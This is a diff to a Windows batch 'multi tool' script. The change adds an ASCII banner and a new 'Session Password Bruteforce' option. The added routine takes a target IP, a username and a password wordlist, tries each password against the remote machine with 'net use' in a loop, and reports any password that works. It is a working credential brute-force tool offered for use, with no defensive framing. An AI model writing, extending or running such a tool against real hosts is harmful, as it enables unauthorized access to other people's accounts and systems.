@@ -6,12 +6,22 @@ goto main
 :main 
 echo.
 
-echo FROZEN MULTI TOOL
 
+echo      __  ___      ____  _    ______            __       __                 __________  ____  _____   _______   __
+echo     /  //  /_  __/ / /_(_)  /_  __/___  ____  / /      / /_  __  __       / ____/ __ \/ __ \/__  /  / ____/ / / /
+echo    / //_/ / / / / / __/ /    / / / __ \/ __ \/ /      / __ \/ / / /      / /_  / /_/ / / / /  / /  / __/ /  \/ / 
+echo   / /  / / /_/ / / /_/ /    / / / /_/ / /_/ / /      / /_/ / /_/ /      / __/ / _, _/ /_/ /  / /__/ /___/ /\  /  
+echo  /_/  /_/\__,_/_/\__/_/    /_/  \____/\____/_/      /_.___/\__, /      /_/   /_/ /_/\____/  /____/_____/_/ /_/   
+echo                                                           /____/                                                 
 
-echo (1) = Ip / Website Pinger 
-echo (2) = Remote Desktop Connection 
-echo (3) = IP Lookup 
+echo and some paste of Ebola man 
+echo .
+echo .
+echo [1] = Ip / Website Pinger 
+echo [2] = Remote Desktop Connection 
+echo [3] = IP Lookup 
+echo [4] = Session Password Bruteforce 
+
 
 set choiceinput=
 set /p choiceinput= Choose : 
@@ -19,6 +29,7 @@ set /p choiceinput= Choose :
 if %choiceinput%==1 goto pinger 
 if %choiceinput%==2 goto RDC
 if %choiceinput%==3 goto iplook
+if %choiceinput%==4 goto bruteforce
 
 :pinger
 cls
@@ -162,3 +173,34 @@ curl -s http://ip-api.com/line/%IP%?fields=message,country,regionName,zip,isp
 pause
 goto start
 
+:bruteforce 
+
+title Session Bruteforce - Made by Ebola man / Improve by FROZEN
+cls
+
+
+set /p ip="IP Address: "
+set /p user="Username: "
+set /p wordlist="Password List ( need to be in the same folder ) : "
+
+set /a count=1
+for /f %%a in (%wordlist%) do (
+  set pass=%%a
+  call :attempt
+)
+echo Password not Found :(
+pause
+exit
+
+:success
+echo.
+echo Password Found! %pass%
+net use \\%ip% /d /y >nul 2>&1
+pause
+goto main
+
+:attempt
+net use \\%ip% /user:%user% %pass% >nul 2>&1
+echo [ATTEMPT %count%] [%pass%]
+set /a count=%count%+1
+if %errorlevel% EQU 0 goto success
